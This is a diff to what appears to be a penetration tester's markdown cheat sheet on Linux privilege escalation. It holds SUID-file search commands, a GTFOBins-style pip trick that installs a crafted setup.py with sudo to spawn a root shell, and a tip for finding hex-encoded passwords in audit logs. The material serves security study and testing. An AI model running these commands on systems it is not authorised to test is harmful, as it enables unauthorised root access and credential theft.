@@ -23,13 +23,9 @@ https://book.hacktricks.xyz/linux-unix/privilege-escalation
 # Sticky-Bit
 
 ```
-
 find / -user root -perm -4000 -print 2>/dev/null
-
 find / -perm -u=s -type f 2>/dev/null
-
 find / -user root -perm -4000 -exec ls -ldb {} \;
-
 ```
 
 # Find files belonging to user
@@ -47,9 +43,10 @@ https://www.hackingarticles.in/lxd-privilege-escalation/
 `pip3 install <local_dir>` searches the local dir for a setup.py and executes it. Helpful if pip is in the sudoers or sbit.
 
 Alternative (https://gtfobins.github.io/gtfobins/pip/):
-```
-TF=$(mktemp -d)
-echo "import os;os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
-sudo -H /usr/bin/pip3 install $TF
-```
 
+`TF=$(mktemp -d)`
+`echo "import os;os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py`
+`sudo -H /usr/bin/pip3 install $TF`
+
+# Audit-Logs
+grep audit-logs for "data=" and decode as hex. Might contain passwords
